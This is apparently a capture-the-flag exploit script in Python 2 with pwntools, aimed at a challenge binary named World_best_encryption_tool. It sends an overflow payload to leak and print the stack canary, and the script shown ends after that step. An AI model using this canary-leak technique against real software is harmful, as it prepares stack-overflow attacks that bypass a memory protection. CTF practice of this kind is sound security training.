#!/usr/bin/python2

# wget https://ctf.j0n9hyun.xyz/files/b3cd8ffd1e258ffe93c00318fc6c464c/World_best_encryption_tool.zip

from pwn import *
import time

p = process("World_best_encryption_tool")

print p.recv()

leak_payload = 'a'*0x39

p.sendline(leak_payload)
print p.recvuntil('a'*7)
canary = unpack('\x00'+p.recv()[:7], 'all', endian='little')

print 'canary: ', hex(canary)
print p.recv()
p.sendline('Yes')
time.sleep(0.5)
